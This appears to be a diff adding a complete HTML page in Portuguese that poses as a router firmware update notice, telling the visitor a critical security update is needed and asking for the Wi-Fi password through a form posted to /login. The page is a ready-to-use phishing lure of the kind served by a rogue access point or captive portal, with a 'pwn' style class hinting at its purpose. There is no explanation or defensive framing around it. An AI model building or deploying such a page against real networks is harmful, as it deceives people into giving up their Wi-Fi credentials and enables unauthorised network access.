@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Atualização de Firmware</title>
+<style>
+    body { font-family: sans-serif; text-align: center; background: #f0f0f0; padding: 20px; }
+    .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
+    input { display: block; width: 90%; margin: 10px auto; padding: 10px; }
+    button { background: #007bff; color: white; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; }
+    .pwn { font-size: 50px; }
+</style>
+</head>
+<body>
+    <div class="box">
+        <div class="pwn">(O_O)</div>
+        <h2>Atualização Necessária</h2>
+        <p>Seu roteador precisa de uma atualização crítica de segurança.</p>
+        <p>Por favor, confirme sua senha Wi-Fi para prosseguir.</p>
+        <form action="/login" method="POST">
+            <input type="password" name="password" placeholder="Senha do Wi-Fi" required>
+            <button type="submit">Atualizar Agora</button>
+        </form>
+    </div>
+</body>
+</html>
